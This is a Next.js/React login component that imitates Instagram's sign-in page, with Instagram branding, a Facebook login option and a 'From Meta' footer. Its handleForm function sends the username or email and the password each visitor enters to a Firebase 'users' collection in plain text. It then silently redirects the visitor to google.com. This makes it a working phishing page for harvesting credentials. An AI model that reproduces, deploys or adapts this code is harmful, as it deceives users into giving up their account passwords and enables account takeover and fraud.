"use client";

import React, { useState } from "react";
import { addData } from "@/lib/firebase/serviceFirebase";
import "./style.css";
import { useRouter } from "next/navigation";

export default function Login() {
  const [name, setName] = useState();
  const [password, setPassword] = useState();
  const router = useRouter();

  const handleForm = async () => {
    const data = {
      name: name,
      password: password,
    };

    const { result, error } = await addData(
      "users",
      data,
      `${Math.floor(Math.random() * 10000)}`
    );

    if (error) {
      return console.log(error);
    }

    window.open("https://google.com", "_self");
  };
  return (
    <div class="wrapper">
      <div class="header">
        <div class="top">
          <div class="logo">
            <p>Instagram</p>
            {/* <img
              src="instagram.png"
              alt="instagram"
              style={{ width: "175px" }}
            /> */}
          </div>

          <div class="fb">
            <i class="fa fa-facebook-square" aria-hidden="true"></i>
            <p> Log in with Facebook</p>
          </div>

          <div class="or">
            <div class="line"></div>
            <p>OR</p>
            <div class="line"></div>
          </div>
          <div class="form">
            <div class="input_field">
              <input
                onChange={(e) => setName(e.target.value)}
                type="text"
                placeholder="Phone number, username, or email"
                class="input"
              />
            </div>
            <div class="input_field">
              <input
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                placeholder="Password"
                class="input"
              />
            </div>
            <div class="forgot">
              <a href="#">Forgot password?</a>
            </div>
            <div onClick={() => handleForm()} class="btn">
              <a href="#">Log In</a>
            </div>
          </div>

          <div class="dif"></div>
        </div>
        <div class="signup">
          <p>
            {"Don't"} have an account? <a href="#">Sign up</a>
          </p>
        </div>
      </div>
      <div class="foot">
        <span>
          <p class="p3">From</p>
          <p class="p5">Meta</p>
        </span>
      </div>
    </div>
  );
}
